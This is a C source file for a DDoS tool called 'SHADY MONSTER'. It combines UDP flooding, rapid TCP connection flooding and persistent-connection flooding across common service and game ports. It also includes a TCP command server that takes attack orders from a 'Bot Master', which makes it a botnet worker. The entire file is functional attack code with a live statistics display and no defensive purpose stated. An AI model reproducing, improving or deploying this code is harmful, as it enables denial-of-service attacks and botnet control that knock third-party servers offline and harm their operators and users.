/*
 * SHADY MONSTER d1-v11 — UDP STORM PRIMARY (Worker + TCP Server)
 * Compile: gcc -O3 -pthread -o d1 d1.c
 * Run worker: sudo ./d1 --server [PORT]
 */

#define _GNU_SOURCE
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>

#define GRN "\033[1;32m"
#define CYN "\033[1;36m"
#define YLW "\033[1;33m"
#define RED "\033[1;31m"
#define WHT "\033[1;37m"
#define RST "\033[0m"
#define CLR "\033[2K\r"

#define UDP_PAYLOAD 1400
#define CONNS_PER_THREAD 128
#define SEND_SIZE 4096
#define SNDBUF_UDP (8 * 1024 * 1024)
#define SNDBUF_TCP (1024 * 1024)
#define PERSIST_POLL_MS 100
#define SYN_POLL_MS 2
#define DEFAULT_SERVER_PORT 8888

static int g_ports[] = {22,80,443,8080,8443,53,3306,5432,6379,27017,3389,21,25,110,143,993,995,25565,19132,27015,3074,5060,11211,9200,9090,3478};
static int g_nports = 26;

struct __attribute__((aligned(64))) stats {
    atomic_ulong udp_pkt;
    atomic_ulong udp_bytes;
    atomic_ulong syn_ok;
    atomic_ulong syn_fail;
    atomic_ulong persist_ok;
    atomic_ulong persist_bytes;
    atomic_int running;
};
static struct stats *S;
static char  g_ip[64];
static int   g_port, g_dur, g_threads_total, g_num_cores, g_th_per_proc;
static pid_t g_attack_pid = 0;

static double now(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void fmt_bw(double mbps, char *o, size_t n) {
    if (mbps >= 1000.0) snprintf(o, n, "%.2f Gbps", mbps / 1000.0);
    else snprintf(o, n, "%.2f Mbps", mbps);
}
static void fmt_pps(unsigned long long p, char *o, size_t n) {
    if (p >= 1000000) snprintf(o, n, "%.2f Mpps", p / 1000000.0);
    else if (p >= 1000) snprintf(o, n, "%.2f Kpps", p / 1000.0);
    else snprintf(o, n, "%llu pps", p);
}

/* ---------- UDP WORKER ---------- */
static void *udp_worker(void *arg) {
    int port = *(int *)arg;
    unsigned char payload[UDP_PAYLOAD];
    for (int i = 0; i < UDP_PAYLOAD; i++)
        payload[i] = (i * 1103515245 + 12345) & 0xFF;

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &(int){SNDBUF_UDP}, sizeof(int));

    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    inet_pton(AF_INET, g_ip, &a.sin_addr);
    connect(fd, (struct sockaddr *)&a, sizeof(a));

    unsigned long local = 0;
    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        if (send(fd, payload, UDP_PAYLOAD, MSG_NOSIGNAL) > 0) local++;
        if (local >= 512) {
            atomic_fetch_add_explicit(&S->udp_pkt, local, memory_order_relaxed);
            atomic_fetch_add_explicit(&S->udp_bytes, local * UDP_PAYLOAD, memory_order_relaxed);
            local = 0;
        }
    }
    atomic_fetch_add_explicit(&S->udp_pkt, local, memory_order_relaxed);
    atomic_fetch_add_explicit(&S->udp_bytes, local * UDP_PAYLOAD, memory_order_relaxed);
    close(fd);
    return NULL;
}

/* ---------- SYN WORKER ---------- */
static void *syn_worker(void *arg) {
    int port = *(int *)arg;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    inet_pton(AF_INET, g_ip, &a.sin_addr);

    unsigned long ok = 0, fail = 0;
    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        fcntl(fd, F_SETFL, O_NONBLOCK);
        int ret = connect(fd, (struct sockaddr *)&a, sizeof(a));
        if (ret == 0) ok++;
        else if (errno == EINPROGRESS) {
            struct pollfd pfd; pfd.fd = fd; pfd.events = POLLOUT;
            poll(&pfd, 1, SYN_POLL_MS); ok++;
        } else fail++;
        close(fd);
        if (ok >= 1024) { atomic_fetch_add_explicit(&S->syn_ok, ok, memory_order_relaxed); ok = 0; }
        if (fail >= 1024) { atomic_fetch_add_explicit(&S->syn_fail, fail, memory_order_relaxed); fail = 0; }
    }
    atomic_fetch_add_explicit(&S->syn_ok, ok, memory_order_relaxed);
    atomic_fetch_add_explicit(&S->syn_fail, fail, memory_order_relaxed);
    return NULL;
}

/* ---------- PERSIST WORKER ---------- */
static void *persist_worker(void *arg) {
    int port = *(int *)arg;
    char buf[SEND_SIZE]; memset(buf, 'X', sizeof(buf));
    struct pollfd pfd[CONNS_PER_THREAD];
    int fds[CONNS_PER_THREAD], states[CONNS_PER_THREAD];
    int active = 0;
    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        fds[i] = -1; pfd[i].fd = -1; states[i] = 0;
    }
    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        for (int i = 0; i < CONNS_PER_THREAD && active < CONNS_PER_THREAD; i++) {
            if (states[i] != 0) continue;
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;
            int yes = 1;
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &yes, sizeof(yes));
            setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &(int){SNDBUF_TCP}, sizeof(int));
            fcntl(fd, F_SETFL, O_NONBLOCK);
            struct sockaddr_in a;
            memset(&a, 0, sizeof(a)); a.sin_family = AF_INET;
            a.sin_port = htons(port); inet_pton(AF_INET, g_ip, &a.sin_addr);
            int ret = connect(fd, (struct sockaddr *)&a, sizeof(a));
            if (ret == 0) { states[i] = 2; fds[i] = fd; pfd[i].fd = fd; pfd[i].events = POLLOUT; active++; atomic_fetch_add_explicit(&S->persist_ok, 1, memory_order_relaxed); }
            else if (errno == EINPROGRESS) { states[i] = 1; fds[i] = fd; pfd[i].fd = fd; pfd[i].events = POLLOUT; active++; }
            else close(fd);
        }
        if (active == 0) { usleep(1000); continue; }
        int ret = poll(pfd, CONNS_PER_THREAD, PERSIST_POLL_MS);
        if (ret > 0) {
            for (int i = 0; i < CONNS_PER_THREAD; i++) {
                if (states[i] == 0) continue;
                if (pfd[i].revents & POLLOUT) {
                    if (states[i] == 1) {
                        int err = 0; socklen_t len = sizeof(err);
                        getsockopt(fds[i], SOL_SOCKET, SO_ERROR, &err, &len);
                        if (err == 0) { states[i] = 2; atomic_fetch_add_explicit(&S->persist_ok, 1, memory_order_relaxed); }
                        else { close(fds[i]); fds[i] = -1; states[i] = 0; pfd[i].fd = -1; active--; continue; }
                    }
                    ssize_t n = send(fds[i], buf, sizeof(buf), MSG_NOSIGNAL);
                    if (n > 0) atomic_fetch_add_explicit(&S->persist_bytes, n, memory_order_relaxed);
                    else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        close(fds[i]); fds[i] = -1; states[i] = 0; pfd[i].fd = -1; active--;
                    }
                }
                if (pfd[i].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                    close(fds[i]); fds[i] = -1; states[i] = 0; pfd[i].fd = -1; active--;
                }
            }
        }
    }
    for (int i = 0; i < CONNS_PER_THREAD; i++) if (fds[i] >= 0) close(fds[i]);
    return NULL;
}

/* ---------- CHILD PROCESS ---------- */
static void child(int core_id) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(core_id % g_num_cores, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    int udp_th = g_th_per_proc * 60 / 100;
    int syn_th = g_th_per_proc * 25 / 100;
    int persist_th = g_th_per_proc - udp_th - syn_th;
    if (udp_th < 1) udp_th = 1; if (syn_th < 1) syn_th = 1; if (persist_th < 1) persist_th = 1;

    int total = udp_th + syn_th + persist_th;
    pthread_t *tids = calloc(total, sizeof(pthread_t));
    int *ports = calloc(total, sizeof(int));
    if (!tids || !ports) _exit(1);

    int ti = 0;
    for (int i = 0; i < udp_th; i++) { ports[ti] = g_ports[i % g_nports]; pthread_create(&tids[ti], NULL, udp_worker, &ports[ti]); ti++; }
    for (int i = 0; i < syn_th; i++) { ports[ti] = g_ports[i % g_nports]; pthread_create(&tids[ti], NULL, syn_worker, &ports[ti]); ti++; }
    for (int i = 0; i < persist_th; i++) { ports[ti] = g_ports[i % g_nports]; pthread_create(&tids[ti], NULL, persist_worker, &ports[ti]); ti++; }
    for (int i = 0; i < total; i++) pthread_join(tids[i], NULL);
    free(ports); free(tids);
    _exit(0);
}

/* ---------- MONITOR ---------- */
static void monitor(void) {
    double t0 = now(), lt = t0;
    unsigned long long ludp = 0, ludp_bytes = 0, lsyn_ok = 0, lsyn_fail = 0, lper_ok = 0, lper_bytes = 0;
    printf("\n");
    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        usleep(500000);
        double nw = now(), dt = nw - lt;
        if (dt <= 0) continue;
        unsigned long long udp = atomic_load_explicit(&S->udp_pkt, memory_order_relaxed);
        unsigned long long udp_bytes = atomic_load_explicit(&S->udp_bytes, memory_order_relaxed);
        unsigned long long syn_ok = atomic_load_explicit(&S->syn_ok, memory_order_relaxed);
        unsigned long long syn_fail = atomic_load_explicit(&S->syn_fail, memory_order_relaxed);
        unsigned long long per_ok = atomic_load_explicit(&S->persist_ok, memory_order_relaxed);
        unsigned long long per_bytes = atomic_load_explicit(&S->persist_bytes, memory_order_relaxed);

        unsigned long long dp = (udp - ludp) + (syn_ok - lsyn_ok) + (syn_fail - lsyn_fail) + (per_ok - lper_ok);
        unsigned long long db = (udp_bytes - ludp_bytes) + (per_bytes - lper_bytes);
        unsigned long long pps = (unsigned long long)(dp / dt);
        double mbps = (db * 8.0) / (dt * 1e6);
        char ps[32], bs[32];
        fmt_pps(pps, ps, sizeof(ps)); fmt_bw(mbps, bs, sizeof(bs));

        double el = nw - t0;
        int pct = (int)(el / g_dur * 100); if (pct > 100) pct = 100;
        int bw = 30, fl = bw * pct / 100; char bar[64];
        for (int i = 0; i < bw; i++) bar[i] = (i < fl) ? '#' : '-';
        bar[bw] = '\0';
        printf(CLR GRN "║ " WHT "%s:%d" GRN " │ %3d%% [%s] │ " GRN "BW: %s" CYN " │ " GRN "PPS: %s" GRN " │ UDP:%llu SYN:%llu P:%llu ║" RST,
               g_ip, g_port, pct, bar, bs, ps, udp, syn_ok, per_ok);
        fflush(stdout);
        ludp = udp; ludp_bytes = udp_bytes; lsyn_ok = syn_ok; lsyn_fail = syn_fail; lper_ok = per_ok; lper_bytes = per_bytes;
        lt = nw;
        if (el >= g_dur) atomic_store_explicit(&S->running, 0, memory_order_relaxed);
    }
    double dur = now() - t0; if (dur <= 0) dur = 1;
    unsigned long long udp = atomic_load_explicit(&S->udp_pkt, memory_order_relaxed);
    unsigned long long udp_bytes = atomic_load_explicit(&S->udp_bytes, memory_order_relaxed);
    unsigned long long syn_ok = atomic_load_explicit(&S->syn_ok, memory_order_relaxed);
    unsigned long long syn_fail = atomic_load_explicit(&S->syn_fail, memory_order_relaxed);
    unsigned long long per_ok = atomic_load_explicit(&S->persist_ok, memory_order_relaxed);
    unsigned long long per_bytes = atomic_load_explicit(&S->persist_bytes, memory_order_relaxed);
    unsigned long long total_pkt = udp + syn_ok + syn_fail + per_ok;
    unsigned long long total_bytes = udp_bytes + per_bytes;
    double ap = total_pkt / dur, am = (total_bytes * 8.0) / (dur * 1e6);
    char ps[32], bs[32];
    fmt_pps((unsigned long long)ap, ps, sizeof(ps)); fmt_bw(am, bs, sizeof(bs));
    printf("\n\n" GRN "  ╔══════════════════════════════════════════╗" RST "\n");
    printf(GRN "  ║        ATTACK FINISHED — SUMMARY         ║" RST "\n");
    printf(GRN "  ╠══════════════════════════════════════════╣" RST "\n");
    printf(GRN "  ║  UDP pkts:     %-22llu ║" RST "\n", udp);
    printf(GRN "  ║  UDP bytes:    %llu (%.2f GB) ║" RST "\n", udp_bytes, udp_bytes / 1e9);
    printf(GRN "  ║  SYN OK:       %-22llu ║" RST "\n", syn_ok);
    printf(GRN "  ║  SYN FAIL:     %-22llu ║" RST "\n", syn_fail);
    printf(GRN "  ║  PERSIST OK:   %-22llu ║" RST "\n", per_ok);
    printf(GRN "  ║  PERSIST BYTES:%llu (%.2f GB) ║" RST "\n", per_bytes, per_bytes / 1e9);
    printf(GRN "  ║  Avg PPS:      %-22s ║" RST "\n", ps);
    printf(GRN "  ║  Avg BW:       %-22s ║" RST "\n", bs);
    printf(GRN "  ╚══════════════════════════════════════════╝" RST "\n\n");
}

/* ---------- CORE ATTACK LOGIC ---------- */
static void run_attack(char *target_ip, int target_port, int duration, int total_threads) {
    strncpy(g_ip, target_ip, sizeof(g_ip)-1);
    g_port = target_port; g_dur = duration; g_threads_total = total_threads;
    g_num_cores = get_nprocs(); if (g_num_cores < 1) g_num_cores = 1;
    g_th_per_proc = g_threads_total / g_num_cores; if (g_th_per_proc < 16) g_th_per_proc = 16;

    S = mmap(NULL, sizeof(struct stats), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (S == MAP_FAILED) { perror("mmap"); return; }
    memset(S, 0, sizeof(struct stats));
    atomic_store_explicit(&S->running, 1, memory_order_relaxed);

    pid_t *pids = calloc(g_num_cores, sizeof(pid_t));
    for (int i = 0; i < g_num_cores; i++) {
        pid_t p = fork();
        if (p == 0) child(i);
        else if (p > 0) pids[i] = p;
        else { atomic_store_explicit(&S->running, 0, memory_order_relaxed); break; }
    }
    monitor();
    for (int i = 0; i < g_num_cores; i++)
        if (pids[i] > 0) { kill(pids[i], SIGKILL); waitpid(pids[i], NULL, 0); }
    free(pids); munmap(S, sizeof(struct stats));
}

/* ---------- TCP COMMAND SERVER ---------- */
static void handle_client(int client_fd) {
    char buf[512];
    int n = recv(client_fd, buf, sizeof(buf)-1, 0);
    if (n <= 0) { close(client_fd); return; }
    buf[n] = '\0';
    // Remove newline
    char *p = strchr(buf, '\n'); if(p) *p = '\0';

    if (strncmp(buf, "attack", 6) == 0) {
        char ip[64]; int port, dur, threads;
        if (sscanf(buf, "attack %s %d %d %d", ip, &port, &dur, &threads) == 4) {
            if (g_attack_pid > 0) {
                send(client_fd, "BUSY: Attack already running", 28, 0);
            } else {
                pid_t pid = fork();
                if (pid == 0) {
                    run_attack(ip, port, dur, threads);
                    exit(0);
                } else if (pid > 0) {
                    g_attack_pid = pid;
                    send(client_fd, "STARTED", 7, 0);
                } else {
                    send(client_fd, "ERROR: fork failed", 18, 0);
                }
            }
        } else {
            send(client_fd, "ERROR: Invalid attack format", 28, 0);
        }
    } else if (strncmp(buf, "stop", 4) == 0) {
        if (g_attack_pid > 0) {
            kill(g_attack_pid, SIGKILL);
            waitpid(g_attack_pid, NULL, 0);
            g_attack_pid = 0;
            send(client_fd, "STOPPED", 7, 0);
        } else {
            send(client_fd, "IDLE", 4, 0);
        }
    } else {
        send(client_fd, "UNKNOWN COMMAND", 15, 0);
    }
    close(client_fd);
}

static void run_server(int port) {
    int sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) { perror("socket"); exit(1); }
    int opt = 1;
    setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(sfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }
    if (listen(sfd, 5) < 0) { perror("listen"); exit(1); }

    printf("[*] SHADY MONSTER Server listening on TCP port %d\n", port);
    printf("[*] Waiting for commands from Bot Master...\n\n");

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int cfd = accept(sfd, (struct sockaddr*)&client_addr, &len);
        if (cfd < 0) { perror("accept"); continue; }
        handle_client(cfd);
    }
    close(sfd);
}

/* ---------- MAIN ---------- */
int main(int argc, char *argv[]) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    if (argc >= 2 && strcmp(argv[1], "--server") == 0) {
        int port = DEFAULT_SERVER_PORT;
        if (argc >= 3) port = atoi(argv[2]);
        run_server(port);
        return 0;
    }

    /* Legacy direct attack mode (giữ nguyên để test) */
    if (argc < 4) {
        printf("Usage (Worker): sudo %s --server [PORT]\n", argv[0]);
        printf("Usage (Direct): sudo %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
        return 1;
    }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]); g_dur = atoi(argv[3]);
    g_threads_total = (argc >= 5) ? atoi(argv[4]) : 0;
    if (g_dur < 1) g_dur = 30;
    g_num_cores = get_nprocs(); if (g_num_cores < 1) g_num_cores = 1;
    if (g_threads_total <= 0) g_threads_total = g_num_cores * 512;
    g_th_per_proc = g_threads_total / g_num_cores;
    if (g_th_per_proc < 16) g_th_per_proc = 16;
    // Single run
    S = mmap(NULL, sizeof(struct stats), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (S == MAP_FAILED) { perror("mmap"); return 1; }
    memset(S, 0, sizeof(struct stats));
    atomic_store_explicit(&S->running, 1, memory_order_relaxed);
    pid_t *pids = calloc(g_num_cores, sizeof(pid_t));
    for (int i = 0; i < g_num_cores; i++) {
        pid_t p = fork();
        if (p == 0) child(i);
        else if (p > 0) pids[i] = p;
        else { atomic_store_explicit(&S->running, 0, memory_order_relaxed); break; }
    }
    monitor();
    for (int i = 0; i < g_num_cores; i++)
        if (pids[i] > 0) { kill(pids[i], SIGKILL); waitpid(pids[i], NULL, 0); }
    free(pids); munmap(S, sizeof(struct stats));
    return 0;
}